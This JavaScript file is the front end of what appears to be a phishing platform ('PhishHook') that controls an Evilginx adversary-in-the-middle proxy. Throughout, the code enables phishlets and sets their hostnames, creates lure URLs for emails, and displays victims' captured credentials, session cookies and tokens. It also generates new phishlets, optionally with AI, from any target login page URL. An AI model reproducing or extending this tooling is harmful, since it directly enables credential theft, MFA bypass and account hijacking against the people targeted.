// evilginx.js drives the Evilginx management console. All requests go
// through the PhishHook API bridge (/api/evilginx/*), which enforces the
// Modify System permission and forwards to the evilginx REST API on
// loopback.

var egPhishlets = []

// egQuery wraps the shared API helper with the evilginx base path.
function egQuery(endpoint, method, data) {
    return query("/evilginx" + endpoint, method, data, true)
}

function egModalError(message) {
    $("#hostnameModal\\.flashes,#lureModal\\.flashes").empty()
        .append("<div style=\"text-align:center\" class=\"alert alert-danger\">\
        <i class=\"fa fa-exclamation-circle\"></i> " + message + "</div>")
}

// loadStatus populates the Status tab.
function loadStatus() {
    $("#status-loading").show()
    $("#status-body").hide()
    egQuery("/status", "GET", {})
        .success(function (status) {
            $("#eg-version").text(status.version)
            $("#eg-domain").text(status.domain || "(not set)")
            $("#eg-ip").text(status.external_ipv4 || "(not set)")
            $("#eg-autocert").text(status.autocert ? "Enabled" : "Disabled")
            if (status.gophish_admin_url && status.gophish_api_key_set) {
                $("#eg-gophish").text(status.gophish_admin_url + " (paired)")
            } else {
                $("#eg-gophish").text("(not paired - run 'config gophish' in evilginx)")
            }
            $("#eg-sites").text(status.enabled_sites)
            $("#eg-sessions").text(status.active_sessions)
            $("#status-loading").hide()
            $("#status-body").show()
        })
        .error(function (data) {
            $("#status-loading").html("<div class=\"alert alert-danger\">\
                <i class=\"fa fa-exclamation-circle\"></i> " +
                (data.responseJSON ? data.responseJSON.message : "Error contacting evilginx") + "</div>")
        })
}

// phishletLabel maps a phishlet status to a CSS label class.
function phishletLabel(status) {
    switch (status) {
        case "enabled": return "label-success"
        case "hidden": return "label-default"
        default: return "label-danger"
    }
}

// loadPhishlets populates the Phishlets tab.
function loadPhishlets() {
    if (typeof phishletsTable === "undefined") {
        phishletsTable = $("#phishletTable").DataTable({
            columnDefs: [{
                orderable: false,
                targets: "no-sort"
            }],
            order: [
                [0, "asc"]
            ]
        })
    }
    egQuery("/phishlets", "GET", {})
        .success(function (phishlets) {
            egPhishlets = phishlets
            $("#phishlets-loading").hide()
            $("#phishletTable").show()
            phishletsTable.clear().draw()
            $.each(phishlets, function (i, p) {
                var actions = ""
                if (p.status !== "enabled" && !p.is_template) {
                    actions += "<button class='btn btn-success btn-xs' onclick='egEnable(\"" + p.name + "\")'>\
                        <i class='fa fa-play'></i> Enable</button> "
                }
                if (p.status === "enabled") {
                    actions += "<button class='btn btn-warning btn-xs' onclick='egDisable(\"" + p.name + "\")'>\
                        <i class='fa fa-pause'></i> Disable</button> "
                }
                if (!p.is_template) {
                    actions += "<button class='btn btn-primary btn-xs' onclick='egSetHostname(\"" + p.name + "\")'>\
                        <i class='fa fa-globe'></i> Hostname</button> "
                    actions += "<button class='btn btn-default btn-xs' onclick='egShowHosts(\"" + p.name + "\")'>\
                        <i class='fa fa-list'></i> DNS</button>"
                }
                var row = [
                    escapeHtml(p.name) + (p.is_template ? " <span class='label label-info'>template</span>" : ""),
                    "<span class=\"label " + phishletLabel(p.status) + "\">" + p.status + "</span>",
                    escapeHtml(p.hostname || "(not set)"),
                    (p.phish_hosts || []).map(escapeHtml).join("<br>"),
                    "<div class='pull-right'>" + actions + "</div>"
                ]
                phishletsTable.row.add(row)
            })
            phishletsTable.draw()
        })
        .error(function (data) {
            $("#phishlets-loading").html("<div class=\"alert alert-danger\">" +
                (data.responseJSON ? data.responseJSON.message : "Error loading phishlets") + "</div>")
        })
}

function egEnable(name) {
    egQuery("/phishlets/" + name + "/enable", "POST", {})
        .success(function () {
            successFlash("Phishlet '" + escapeHtml(name) + "' enabled")
            loadPhishlets()
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Enable failed")
        })
}

function egDisable(name) {
    egQuery("/phishlets/" + name + "/disable", "POST", {})
        .success(function () {
            successFlash("Phishlet '" + escapeHtml(name) + "' disabled")
            loadPhishlets()
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Disable failed")
        })
}

function egSetHostname(name) {
    $("#hostname-phishlet").text(name)
    $("#hostname-input").val("")
    $("#hostnameModal\\.flashes").empty()
    $("#hostnameModal").modal("show")
    // Remove any previous handler to avoid stacking calls.
    $("#hostname-save").off("click").on("click", function () {
        var hostname = $("#hostname-input").val().trim()
        if (hostname === "") {
            egModalError("Hostname cannot be empty")
            return
        }
        egQuery("/phishlets/" + name + "/hostname", "POST", { hostname: hostname })
            .success(function () {
                $("#hostnameModal").modal("hide")
                successFlash("Hostname updated for '" + escapeHtml(name) + "'")
                loadPhishlets()
            })
            .error(function (data) {
                egModalError(data.responseJSON ? data.responseJSON.message : "Failed to set hostname")
            })
    })
}

function egShowHosts(name) {
    egQuery("/phishlets/" + name + "/hosts", "GET", {})
        .success(function (data) {
            var records = (data.records || []).join("\n")
            if (records === "") {
                Swal.fire("No DNS records", "No hosts are active for this phishlet.", "info")
                return
            }
            Swal.fire({
                title: "DNS records for " + name,
                text: records,
                type: "info"
            })
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Failed to get hosts")
        })
}

// loadLures populates the Lures tab.
function loadLures() {
    if (typeof luresTable === "undefined") {
        luresTable = $("#lureTable").DataTable({
            columnDefs: [{
                orderable: false,
                targets: "no-sort"
            }],
            order: [
                [0, "asc"]
            ]
        })
    }
    egQuery("/lures", "GET", {})
        .success(function (lures) {
            $("#lures-loading").hide()
            $("#lureTable").show()
            luresTable.clear().draw()
            $.each(lures, function (i, l) {
                var actions = "<button class='btn btn-default btn-xs' onclick='egDeleteLure(" + l.id + ")'>\
                    <i class='fa fa-trash-o'></i> Delete</button>"
                if (l.url) {
                    actions = "<button class='btn btn-primary btn-xs' onclick='egCopyLure(" + l.id + ")'>\
                        <i class='fa fa-copy'></i> Copy URL</button> " + actions
                }
                var row = [
                    escapeHtml(l.id),
                    escapeHtml(l.phishlet),
                    escapeHtml(l.path),
                    escapeHtml(l.redirect_url),
                    "<div class='pull-right'>" + actions + "</div>"
                ]
                luresTable.row.add(row)
            })
            luresTable.draw()
        })
        .error(function (data) {
            $("#lures-loading").html("<div class=\"alert alert-danger\">" +
                (data.responseJSON ? data.responseJSON.message : "Error loading lures") + "</div>")
        })
}

function egCopyLure(id) {
    egQuery("/lures", "GET", {})
        .success(function (lures) {
            $.each(lures, function (i, l) {
                if (parseInt(l.id) === id && l.url) {
                    var el = document.createElement("textarea")
                    el.value = l.url
                    document.body.appendChild(el)
                    el.select()
                    document.execCommand("copy")
                    document.body.removeChild(el)
                    successFlash("Lure URL copied to clipboard")
                    return false
                }
            })
        })
}

function egDeleteLure(id) {
    Swal.fire({
        title: "Are you sure?",
        text: "This will delete the lure. Emails already sent will keep working until the phishlet is disabled.",
        type: "warning",
        showCancelButton: true,
        confirmButtonText: "Delete",
        confirmButtonColor: "#428bca",
        reverseButtons: true
    }).then(function (result) {
        if (result.value) {
            egQuery("/lures/" + id, "DELETE", {})
                .success(function () {
                    successFlash("Lure deleted")
                    loadLures()
                })
                .error(function (data) {
                    errorFlash(data.responseJSON ? data.responseJSON.message : "Delete failed")
                })
        }
    })
}

function showLureModal() {
    var options = egPhishlets.filter(function (p) { return !p.is_template })
    if (options.length === 0) {
        errorFlash("No phishlets available. Load a phishlet into evilginx first.")
        return
    }
    $("#lurePhishlet").empty()
    $.each(options, function (i, p) {
        $("#lurePhishlet").append($("<option/>").val(p.name).text(p.name))
    })
    $("#lureRedirect").val("")
    $("#lureModalTitle").text("New Lure")
    $("#lureModal\\.flashes").empty()
    $("#lureModal").modal("show")
    $("#lure-save").off("click").on("click", function () {
        var lure = {
            phishlet: $("#lurePhishlet").val(),
            redirect_url: $("#lureRedirect").val()
        }
        egQuery("/lures", "POST", lure)
            .success(function () {
                $("#lureModal").modal("hide")
                successFlash("Lure created")
                loadLures()
            })
            .error(function (data) {
                egModalError(data.responseJSON ? data.responseJSON.message : "Failed to create lure")
            })
    })
}

// loadSessions populates the Sessions tab.
function loadSessions() {
    if (typeof sessionsTable === "undefined") {
        sessionsTable = $("#sessionTable").DataTable({
            columnDefs: [{
                orderable: false,
                targets: "no-sort"
            }],
            order: [
                [3, "desc"]
            ]
        })
    }
    egQuery("/sessions", "GET", {})
        .success(function (sessions) {
            $("#sessions-loading").hide()
            $("#sessionTable").show()
            sessionsTable.clear().draw()
            $.each(sessions, function (i, s) {
                var captured = []
                if (s.creds_captured) captured.push("<span class='label label-danger'>credentials</span>")
                if (s.tokens_captured) captured.push("<span class='label label-warning'>tokens</span>")
                var actions = "<button class='btn btn-primary btn-xs' onclick='egShowSession(\"" + s.session_id + "\")'>\
                    <i class='fa fa-eye'></i> View</button> "
                actions += "<button class='btn btn-danger btn-xs' onclick='egDeleteSession(\"" + s.session_id + "\")'>\
                    <i class='fa fa-trash-o'></i></button>"
                var row = [
                    escapeHtml(String(s.id)),
                    escapeHtml(s.phishlet),
                    escapeHtml(s.username),
                    moment.unix(s.create_time).format("MMMM Do YYYY, h:mm:ss a"),
                    captured.join(" "),
                    "<div class='pull-right'>" + actions + "</div>"
                ]
                sessionsTable.row.add(row)
            })
            sessionsTable.draw()
        })
        .error(function (data) {
            $("#sessions-loading").html("<div class=\"alert alert-danger\">" +
                (data.responseJSON ? data.responseJSON.message : "Error loading sessions") + "</div>")
        })
}

var egSessionDetail = null

function egShowSession(sid) {
    egQuery("/sessions/" + sid, "GET", {})
        .success(function (detail) {
            egSessionDetail = detail
            $("#sessionModalSid").text(detail.session_id)
            var html = "<div class='row'><div class='col-md-6'>"
            html += "<b>Phishlet:</b> " + escapeHtml(detail.phishlet) + "<br>"
            html += "<b>Username:</b> " + escapeHtml(detail.username) + "<br>"
            html += "<b>Password:</b> " + (detail.password ? "********" : "(not captured)") + "<br>"
            html += "<b>Remote address:</b> " + escapeHtml(detail.remote_addr) + "<br>"
            html += "<b>User agent:</b> " + escapeHtml(detail.useragent) + "<br>"
            html += "<b>Created:</b> " + moment.unix(detail.create_time).format() + "<br>"
            html += "</div><div class='col-md-6'>"
            html += "<b>Landing URL:</b> " + escapeHtml(detail.landing_url) + "<br>"
            html += "<b>Custom:</b> " + escapeHtml(JSON.stringify(detail.custom)) + "<br>"
            html += "<b>Body tokens:</b> " + Object.keys(detail.body_tokens || {}).join(", ") + "<br>"
            html += "<b>HTTP tokens:</b> " + Object.keys(detail.http_tokens || {}).join(", ") + "<br>"
            html += "</div></div>"
            html += "<h4>Captured cookies</h4><table class='table table-striped'>\
                <thead><tr><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>"
            $.each(detail.tokens || {}, function (domain, tokens) {
                $.each(tokens, function (name, tok) {
                    html += "<tr><td>" + escapeHtml(domain) + "</td><td>" + escapeHtml(name) +
                        "</td><td style='max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap'>" +
                        escapeHtml(tok.Value || "") + "</td></tr>"
                })
            })
            html += "</tbody></table>"
            $("#session-detail").html(html)
            $("#sessionModal").modal("show")
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Failed to load session")
        })
}

function egDeleteSession(sid) {
    Swal.fire({
        title: "Are you sure?",
        text: "This permanently deletes the captured session and its tokens.",
        type: "warning",
        showCancelButton: true,
        confirmButtonText: "Delete",
        confirmButtonColor: "#428bca",
        reverseButtons: true
    }).then(function (result) {
        if (result.value) {
            egQuery("/sessions/" + sid, "DELETE", {})
                .success(function () {
                    successFlash("Session deleted")
                    loadSessions()
                })
                .error(function (data) {
                    errorFlash(data.responseJSON ? data.responseJSON.message : "Delete failed")
                })
        }
    })
}

// ---------------------------------------------------------------------------
// Phishlet generator sidecar (proxied through /api/phishletgen/*)
// ---------------------------------------------------------------------------

var pgLastYaml = null
var pgLastPhishlet = null

function pgQuery(endpoint, method, data) {
    return query("/phishletgen" + endpoint, method, data, true)
}

// pgCheckHealth shows or hides the generator panel depending on the
// sidecar's availability.
function pgCheckHealth() {
    pgQuery("/health", "GET", {})
        .success(function (data) {
            $("#generator-panel").show()
            $("#generator-unconfigured").hide()
            pgLoadLibrary()
        })
        .error(function (data) {
            if (data.status === 503) {
                $("#generator-unconfigured").show()
                $("#generator-panel").hide()
            } else {
                // Configured but the sidecar is down.
                $("#generator-panel").show()
                $("#generator-unconfigured").hide()
                errorFlash(data.responseJSON ? data.responseJSON.message : "Phishlet generator is unreachable")
            }
        })
}

// pgGenerate runs the end-to-end analyze + generate flow.
function pgGenerate() {
    var targetUrl = $("#genUrl").val().trim()
    if (targetUrl === "") {
        errorFlash("Enter a target login page URL first")
        return
    }
    var payload = {
        url: targetUrl,
        use_ai: $("#genUseAI").is(":checked"),
        author: $("#genAuthor").val()
    }
    var name = $("#genName").val().trim()
    if (name !== "") {
        payload.custom_name = name
    }
    $("#genButton").prop("disabled", true)
    $("#genStatus").show()
    $("#genEditor").hide()
    $("#genWarnings").hide()
    pgQuery("/generate/from-url", "POST", payload)
        .success(function (resp) {
            $("#genButton").prop("disabled", false)
            $("#genStatus").hide()
            pgLastYaml = resp.yaml_content
            pgLastPhishlet = resp.phishlet
            $("#genYaml").val(resp.yaml_content)
            $("#genEditor").show()
            var warnHtml = ""
            if (resp.warnings && resp.warnings.length > 0) {
                warnHtml += "<div class='alert alert-warning'><b>Warnings:</b><ul>"
                $.each(resp.warnings, function (i, w) { warnHtml += "<li>" + escapeHtml(w) + "</li>" })
                warnHtml += "</ul></div>"
            }
            if (resp.suggestions && resp.suggestions.length > 0) {
                warnHtml += "<div class='alert alert-info'><b>Suggestions:</b><ul>"
                $.each(resp.suggestions, function (i, s) { warnHtml += "<li>" + escapeHtml(s) + "</li>" })
                warnHtml += "</ul></div>"
            }
            if (warnHtml !== "") {
                $("#genWarnings").html(warnHtml).show()
            }
            successFlash("Phishlet generated - review and validate the YAML")
        })
        .error(function (data) {
            $("#genButton").prop("disabled", false)
            $("#genStatus").hide()
            errorFlash(data.responseJSON ? data.responseJSON.message : "Generation failed")
        })
}

// pgValidate validates the current YAML against the evilginx schema.
function pgValidate() {
    pgQuery("/validate/", "POST", { yaml_content: $("#genYaml").val() })
        .success(function (result) {
            var html = ""
            if (result.valid) {
                html += "<div class='alert alert-success'><i class='fa fa-check-circle'></i> Valid evilginx phishlet</div>"
            } else {
                html += "<div class='alert alert-danger'><b>Validation failed:</b><ul>"
                $.each(result.errors || [], function (i, e) { html += "<li>" + escapeHtml(e) + "</li>" })
                html += "</ul></div>"
            }
            if (result.warnings && result.warnings.length > 0) {
                html += "<div class='alert alert-warning'><ul>"
                $.each(result.warnings, function (i, w) { html += "<li>" + escapeHtml(w) + "</li>" })
                html += "</ul></div>"
            }
            $("#genValidation").html(html)
        })
        .error(function (data) {
            $("#genValidation").html("<div class='alert alert-danger'>" +
                (data.responseJSON ? data.responseJSON.message : "Validation request failed") + "</div>")
        })
}

function pgCopy() {
    var el = document.createElement("textarea")
    el.value = $("#genYaml").val()
    document.body.appendChild(el)
    el.select()
    document.execCommand("copy")
    document.body.removeChild(el)
    successFlash("Phishlet YAML copied to clipboard")
}

function pgDownload() {
    var name = "phishlet.yaml"
    if (pgLastPhishlet && pgLastPhishlet.name) {
        name = pgLastPhishlet.name + ".yaml"
    }
    var blob = new Blob([$("#genYaml").val()], { type: "text/yaml" })
    var a = document.createElement("a")
    a.href = URL.createObjectURL(blob)
    a.download = name
    a.click()
    URL.revokeObjectURL(a.href)
}

// pgSaveLibrary stores the phishlet in the generator's library.
function pgSaveLibrary() {
    var name = (pgLastPhishlet && pgLastPhishlet.name) || "generated-phishlet"
    var payload = {
        name: name,
        author: $("#genAuthor").val() || "@phishhook",
        target_url: $("#genUrl").val() || "",
        yaml_content: $("#genYaml").val(),
        tags: ["phishhook"]
    }
    pgQuery("/phishlets/", "POST", payload)
        .success(function () {
            successFlash("Saved to phishlet library")
            pgLoadLibrary()
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Failed to save to library")
        })
}

// pgLoadLibrary lists saved phishlets from the generator library.
function pgLoadLibrary() {
    if (typeof pgLibraryTable === "undefined") {
        pgLibraryTable = $("#pgLibraryTable").DataTable({
            columnDefs: [{ orderable: false, targets: "no-sort" }],
            order: [[0, "asc"]]
        })
    }
    pgQuery("/phishlets/", "GET", {})
        .success(function (list) {
            $("#pgLibraryTable").show()
            pgLibraryTable.clear().draw()
            $.each(list.phishlets || [], function (i, p) {
                var validation = p.validation_status === "valid"
                    ? "<span class='label label-success'>valid</span>"
                    : (p.validation_status === "invalid"
                        ? "<span class='label label-danger'>invalid</span>"
                        : "<span class='label label-default'>unknown</span>")
                var actions = "<button class='btn btn-primary btn-xs' onclick='pgLoadIntoEditor(\"" + p.id + "\")'>\
                    <i class='fa fa-edit'></i> Open</button> "
                actions += "<button class='btn btn-danger btn-xs' onclick='pgDeleteLibrary(\"" + p.id + "\")'>\
                    <i class='fa fa-trash-o'></i></button>"
                var row = [
                    escapeHtml(p.name),
                    escapeHtml(p.target_url),
                    validation,
                    "<div class='pull-right'>" + actions + "</div>"
                ]
                pgLibraryTable.row.add(row)
            })
            pgLibraryTable.draw()
        })
        .error(function () {
            // Silent - the library is a convenience.
        })
}

function pgLoadIntoEditor(id) {
    pgQuery("/phishlets/" + id, "GET", {})
        .success(function (p) {
            pgLastYaml = p.yaml_content
            pgLastPhishlet = null
            $("#genUrl").val(p.target_url || "")
            $("#genYaml").val(p.yaml_content)
            $("#genEditor").show()
            $("#genValidation").empty()
            $("a[href='#generator']").tab("show")
        })
        .error(function (data) {
            errorFlash(data.responseJSON ? data.responseJSON.message : "Failed to load phishlet")
        })
}

function pgDeleteLibrary(id) {
    Swal.fire({
        title: "Are you sure?",
        text: "This deletes the phishlet from the generator library.",
        type: "warning",
        showCancelButton: true,
        confirmButtonText: "Delete",
        confirmButtonColor: "#428bca",
        reverseButtons: true
    }).then(function (result) {
        if (result.value) {
            pgQuery("/phishlets/" + id, "DELETE", {})
                .success(function () {
                    successFlash("Phishlet deleted from library")
                    pgLoadLibrary()
                })
                .error(function (data) {
                    errorFlash(data.responseJSON ? data.responseJSON.message : "Delete failed")
                })
        }
    })
}

$(document).ready(function () {
    // Check whether the bridge is configured; the API returns 503 with a
    // descriptive message when it isn't.
    egQuery("/status", "GET", {})
        .success(function () {
            $("#evilginx-panel").show()
            loadStatus()
        })
        .error(function (data) {
            if (data.status === 503) {
                $("#evilginx-unconfigured").show()
                $("#evilginx-panel").hide()
                return
            }
            // Configured but unreachable - show the panel with errors.
            $("#evilginx-panel").show()
            loadStatus()
        })
    // Tab switch handlers refresh each view on demand.
    $("a[href='#phishlets']").on("shown.bs.tab", loadPhishlets)
    $("a[href='#lures']").on("shown.bs.tab", loadLures)
    $("a[href='#sessions']").on("shown.bs.tab", loadSessions)
    $("a[href='#generator']").on("shown.bs.tab", pgCheckHealth)
    // Copy session JSON.
    $("#session-copy-json").on("click", function () {
        if (!egSessionDetail) return
        var el = document.createElement("textarea")
        el.value = JSON.stringify(egSessionDetail, null, 2)
        document.body.appendChild(el)
        el.select()
        document.execCommand("copy")
        document.body.removeChild(el)
        successFlash("Session JSON copied to clipboard")
    })
})
